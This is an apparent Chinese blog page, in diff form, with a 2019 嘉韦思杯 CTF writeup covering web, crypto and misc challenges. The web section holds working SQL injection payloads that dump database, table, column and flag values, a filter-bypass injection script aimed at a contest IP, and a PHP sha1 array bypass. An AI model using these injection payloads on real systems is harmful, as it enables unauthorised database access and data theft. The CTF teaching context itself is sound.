@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>嘉韦思杯 2019 | hghhgghhg | CTF is funny!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="writeup">
+    <meta name="description" content="web土肥原贤二题目描述题目分析SQL注入，应该是没有过滤，且有报错 题目解决查库 1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos;0&amp;apos; union select 1,2,3,database()#  返回 1luozhen  继续查表 1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos;0&amp;apos; union select 1,2,3,group_conca">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="嘉韦思杯 2019">
+<meta property="og:url" content="http:&#x2F;&#x2F;localhost:4000&#x2F;2019&#x2F;03&#x2F;30&#x2F;%E5%98%89%E9%9F%A6%E6%80%9D%E6%9D%AF--Writeup&#x2F;index.html">
+<meta property="og:site_name" content="hghhgghhg">
+<meta property="og:description" content="web土肥原贤二题目描述题目分析SQL注入，应该是没有过滤，且有报错 题目解决查库 1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos;0&amp;apos; union select 1,2,3,database()#  返回 1luozhen  继续查表 1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos;0&amp;apos; union select 1,2,3,group_conca">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-10-29T11:17:49.700Z">
+<meta name="twitter:card" content="summary">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/DDD428LOGO.png)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/ddd428.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">hgh</h5>
+          <a href="mailto:1950771661@qq.com" target="_blank" rel="noopener" title="1950771661@qq.com" class="mail">1950771661@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/hghhgghhg" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">嘉韦思杯 2019</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">嘉韦思杯 2019</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-03-30T14:43:45.000Z" itemprop="datePublished" class="page-time">
+  2019-03-30
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web"><span class="post-toc-number">1.</span> <span class="post-toc-text">web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#土肥原贤二"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">土肥原贤二</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决"><span class="post-toc-number">1.1.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#吴佩孚"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">吴佩孚</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-1"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-1"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-1"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#戴星炳"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">戴星炳</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-2"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-2"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-2"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#晴气庆胤"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">晴气庆胤</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-3"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-3"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-3"><span class="post-toc-number">1.4.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#冈村宁次"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">冈村宁次</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-4"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-4"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-4"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#作战计划"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">作战计划</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-5"><span class="post-toc-number">1.6.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-5"><span class="post-toc-number">1.6.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-5"><span class="post-toc-number">1.6.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#池步洲"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">池步洲</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-6"><span class="post-toc-number">1.7.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-6"><span class="post-toc-number">1.7.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-6"><span class="post-toc-number">1.7.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#crypto"><span class="post-toc-number">2.</span> <span class="post-toc-text">crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#日军空袭"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">日军空袭</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-7"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-7"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-7"><span class="post-toc-number">2.1.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#潘汉年"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">潘汉年</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-8"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-8"><span class="post-toc-number">2.2.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-8"><span class="post-toc-number">2.2.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#袁殊"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">袁殊</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-9"><span class="post-toc-number">2.3.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-9"><span class="post-toc-number">2.3.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-9"><span class="post-toc-number">2.3.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#misc"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">misc</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#死亡真相"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">死亡真相</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-10"><span class="post-toc-number">2.5.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-10"><span class="post-toc-number">2.5.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-10"><span class="post-toc-number">2.5.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#大美晚报"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">大美晚报</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目描述-11"><span class="post-toc-number">2.6.1.</span> <span class="post-toc-text">题目描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析-11"><span class="post-toc-number">2.6.2.</span> <span class="post-toc-text">题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目解决-11"><span class="post-toc-number">2.6.3.</span> <span class="post-toc-text">题目解决</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-嘉韦思杯--Writeup"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">嘉韦思杯 2019</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-03-30 22:43:45" datetime="2019-03-30T14:43:45.000Z"  itemprop="datePublished">2019-03-30</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="土肥原贤二"><a href="#土肥原贤二" class="headerlink" title="土肥原贤二"></a>土肥原贤二</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>SQL注入，应该是没有过滤，且有报错</p>
+<h4 id="题目解决"><a href="#题目解决" class="headerlink" title="题目解决"></a>题目解决</h4><p>查库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or &apos;1&apos;=&apos;0&apos; union select 1,2,3,database()#</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">luozhen</span><br></pre></td></tr></table></figure>
+
+<p>继续查表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or &apos;1&apos;=&apos;0&apos; union select 1,2,3,group_concat(table_name)from information_schema.tables where table_schema=&apos;luozhen&apos;#</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,goods</span><br></pre></td></tr></table></figure>
+
+<p>继续查列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or &apos;1&apos;=&apos;0&apos; union select 1,2,3,group_concat(column_name)from information_schema.columns where table_name=&apos;flag&apos;#</span><br></pre></td></tr></table></figure>
+
+<p>返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,flag</span><br></pre></td></tr></table></figure>
+
+<p>最后查值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or &apos;1&apos;=&apos;0&apos; union select 1,2,3,flag from flag#</span><br></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;20_welcome_19&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="吴佩孚"><a href="#吴佩孚" class="headerlink" title="吴佩孚"></a>吴佩孚</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>base64加jsfuck(丢浏览器控制台即可）</p>
+<h4 id="题目解决-1"><a href="#题目解决-1" class="headerlink" title="题目解决"></a>题目解决</h4><p>先解一下base64，然后丢控制台，done!</p>
+<p>flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sdf465454dfgert32&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="戴星炳"><a href="#戴星炳" class="headerlink" title="戴星炳"></a>戴星炳</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p>爬取网页，提取表达式，eval，然后post</p>
+<h4 id="题目解决-2"><a href="#题目解决-2" class="headerlink" title="题目解决"></a>题目解决</h4><p>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = &quot;http://47.103.43.235:82/web/a/index.php&quot;</span><br><span class="line">re = requests.get(url).text</span><br><span class="line">re = re.search(&apos;0.*&lt;&apos;,r).group(0)[:-1]</span><br><span class="line">data = &#123;&quot;result&quot;:eval(r)&#125;</span><br><span class="line">re = requests.post(url,data=data).text</span><br><span class="line">print(re)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0U_4R3_3o_F4ST!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="晴气庆胤"><a href="#晴气庆胤" class="headerlink" title="晴气庆胤"></a>晴气庆胤</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">/*</span><br><span class="line">if ((string)$_POST[&apos;paraml&apos;]!==(string)$_POST[&apos;param2&apos;]&amp;&amp;md5($_POST[&apos;paraml&apos;])===md5($_POST[&apos;param2&apos;]))</span><br><span class="line">*/</span><br><span class="line">    function tanchu(type,info,time)&#123;</span><br><span class="line">        $(&apos;.el-message&apos;).removeClass(&apos;mis-dis&apos;);</span><br><span class="line">        $(&apos;.el-message&apos;).addClass(type);</span><br><span class="line">        $(&apos;.el-message&apos;).css(&apos;z-index&apos;,&apos;999999&apos;);</span><br><span class="line">        $(&apos;.el-message p&apos;).html(info);</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>类似题目    hgame2019-week3，web题：</p>
+<h4 id="题目解决-3"><a href="#题目解决-3" class="headerlink" title="题目解决"></a>题目解决</h4><p>看上面链接里面的wp就好。</p>
+<p>flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">忘了，平台关了</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="冈村宁次"><a href="#冈村宁次" class="headerlink" title="冈村宁次"></a>冈村宁次</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>base64,rev(反字符串），一次过滤union,select</p>
+<h4 id="题目解决-4"><a href="#题目解决-4" class="headerlink" title="题目解决"></a>题目解决</h4><p>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">url = &quot;http://47.103.43.235:83/web/a/index.php?id=&quot;</span><br><span class="line">string = &quot;1 uniunionon selselectect 1,1,1,1,1,flag from ctf_sql.FLAG#&quot;</span><br><span class="line">string = string.encode(&apos;utf-8&apos;)</span><br><span class="line">string = base64.b64encode(string)</span><br><span class="line">string = string[::-1]</span><br><span class="line">re = requests.get(url+str(string))</span><br><span class="line">print(string)</span><br><span class="line">print(re.text)</span><br></pre></td></tr></table></figure>
+
+<p>flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;s9li_1s_s0_e4sY&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="作战计划"><a href="#作战计划" class="headerlink" title="作战计划"></a>作战计划</h3><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h4><p>原题原payload，一键getshell</p>
+<h4 id="题目解决-5"><a href="#题目解决-5" class="headerlink" title="题目解决"></a>题目解决</h4><p>flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">忘了，平台关了</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="池步洲"><a href="#池步洲" class="headerlink" title="池步洲"></a>池步洲</h3><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h4><p>提示index.phps<br>文件内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;********&apos;;</span><br><span class="line">if (isset($_POST[&apos;name&apos;]) and isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">	if ($_POST[&apos;name&apos;] == $_POST[&apos;password&apos;])</span><br><span class="line">		print &apos;name and password must be diffirent&apos;;</span><br><span class="line">	else if (sha1($_POST[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;]))</span><br><span class="line">		die($flag);</span><br><span class="line">	else print &apos;invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>数组绕过sha1</p>
+<h4 id="题目解决-6"><a href="#题目解决-6" class="headerlink" title="题目解决"></a>题目解决</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure>
+
+<p>flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_just_br0ke_sha1&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="日军空袭"><a href="#日军空袭" class="headerlink" title="日军空袭"></a>日军空袭</h3><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h4><p>base64 url 栅栏</p>
+<h4 id="题目解决-7"><a href="#题目解决-7" class="headerlink" title="题目解决"></a>题目解决</h4><p>不断base64，url解密得：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fB__l621a4h4g_ai&#123;&amp;i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后栅栏：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fB__</span><br><span class="line">l621</span><br><span class="line">a4h4</span><br><span class="line">g_ai</span><br><span class="line">&#123;&amp;i&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;B64_&amp;_2hai_14i&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="潘汉年"><a href="#潘汉年" class="headerlink" title="潘汉年"></a>潘汉年</h3><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你能解开这段密文吗？</span><br><span class="line">Tips：flag格式为 flag&#123;xxx&#125;</span><br><span class="line">bg[`sZ*Zg&apos;dPfP`VM_SXVd</span><br></pre></td></tr></table></figure>
+
+<h4 id="题目分析-8"><a href="#题目分析-8" class="headerlink" title="题目分析"></a>题目分析</h4><p>变异凯撒，间隔5,6,7,8.。。</p>
+<h4 id="题目解决-8"><a href="#题目解决-8" class="headerlink" title="题目解决"></a>题目解决</h4><p>写脚本或者手动解</p>
+<p>flag:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c4es4r_variation&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="袁殊"><a href="#袁殊" class="headerlink" title="袁殊"></a>袁殊</h3><h4 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-9"><a href="#题目分析-9" class="headerlink" title="题目分析"></a>题目分析</h4><p>先用openssl提取公钥文件，直接分离n</p>
+<h4 id="题目解决-9"><a href="#题目解决-9" class="headerlink" title="题目解决"></a>题目解决</h4><p>公钥提取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in gy.key</span><br></pre></td></tr></table></figure>
+
+<p>分离或者本地工具</p>
+<p>最后解密脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">n1=0xA9BD4C7A7763370A042FE6BEC7DDC841602DB942C7A362D1B5D372A4D08912D9</span><br><span class="line">n = 76775333340223961139427050707840417811156978085146970312315886671546666259161</span><br><span class="line">e = 65537</span><br><span class="line">p = 273821108020968288372911424519201044333</span><br><span class="line">q = 280385007186315115828483000867559983517</span><br><span class="line">d = gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line"></span><br><span class="line">with open(&quot;fllllllag.txt&quot;,&apos;rb&apos;) as f:</span><br><span class="line">    print(f.read().encode(&apos;hex&apos;))</span><br><span class="line"></span><br><span class="line">c = 0x8ddbf10eb814bbe60cb05957a2445ae99f11a1e6ee33877082d8d2b01428d731</span><br><span class="line">flag = pow(c,d,n)</span><br><span class="line">print hex(flag)</span><br></pre></td></tr></table></figure>
+
+<p>然后在线16进制转字符串（要去掉一位）</p>
+<p>flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;_2o!9_CTF_ECUN_&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h3 id="死亡真相"><a href="#死亡真相" class="headerlink" title="死亡真相"></a>死亡真相</h3><h4 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h4><h4 id="题目分析-10"><a href="#题目分析-10" class="headerlink" title="题目分析"></a>题目分析</h4><p>先丢audacity，然后看频谱图发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:85a9d4517d4725_b9_8cbc9fd_554216</span><br></pre></td></tr></table></figure>
+
+<p>32位，经过一番折腾，猜测是MD5值，但缺了3个数据。</p>
